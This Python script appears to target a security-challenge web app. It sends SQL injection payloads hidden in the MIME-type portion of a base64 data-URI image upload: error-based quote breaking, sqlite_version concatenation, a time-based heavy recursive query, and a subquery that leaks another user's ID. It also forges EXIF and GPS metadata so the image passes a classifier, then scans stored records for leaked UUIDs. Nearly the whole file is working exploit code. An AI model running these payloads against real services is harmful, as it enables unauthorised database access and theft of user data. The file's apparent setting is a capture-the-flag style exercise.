# datauri_sqli.py — the server parses the data-URI prefix "data:image/<type>;base64,".
# That <type> string is extracted and may be stored/used in a query. Never injection-tested.
# Test error-based (500) and time-based on the mime-type portion.
import requests, base64, time
from PIL import Image
import piexif

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

# valid landscape bytes (must pass classifier). Build once, reuse the base64 body.
img = Image.open("paisaje.png").convert("RGB"); img.save("du.jpg","jpeg",quality=85)
def dms(x):
    dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
    'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
    'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
           piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
piexif.insert(piexif.dump(ex),"du.jpg")
B64 = base64.b64encode(open("du.jpg","rb").read()).decode()

HEAVY = "(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))"
q="'"

def send(prefix, desc):
    uri = prefix + B64
    t=time.time()
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return round(time.time()-t,2), r.status_code, r.text[:70].strip()

tests = [
    ("baseline",   "data:image/jpeg;base64,"),
    ("quote_type", "data:image/jpeg'"+";base64,"),
    ("type_concat","data:image/"+q+"||(SELECT sqlite_version())||"+q+";base64,"),
    ("type_time",  "data:image/"+q+"||"+HEAVY+"||"+q+";base64,"),
    ("type_leak",  "data:image/"+q+"||(SELECT user_id FROM images WHERE id=1)||"+q+";base64,"),
    ("no_type",    "data:;base64,"),
    ("weird_type", "data:image/png;base64,"),   # png prefix but jpeg bytes
]
print("case          time  status  body")
for name, pfx in tests:
    dt, sc, body = send(pfx, "DU_"+name)
    print(f"{name:12} {dt:5} {sc}  {body}")

# readback: check if any leaked uuid or executed
import re
data = requests.get(f"{BASE}/images/{UID}").json()
UURE=re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
print("\n-- recent DU_ rows --")
for img in data:
    if str(img.get("description","")).startswith("DU_"):
        s=img.get("summary_ocr",""); mk=img.get("make","")
        print(f"  {img['description']:14} make={mk!r} ocr={s!r}")
        for u in UURE.findall(str(mk)+str(s)):
            if u!=UID: print("     >>> LEAK:", u)
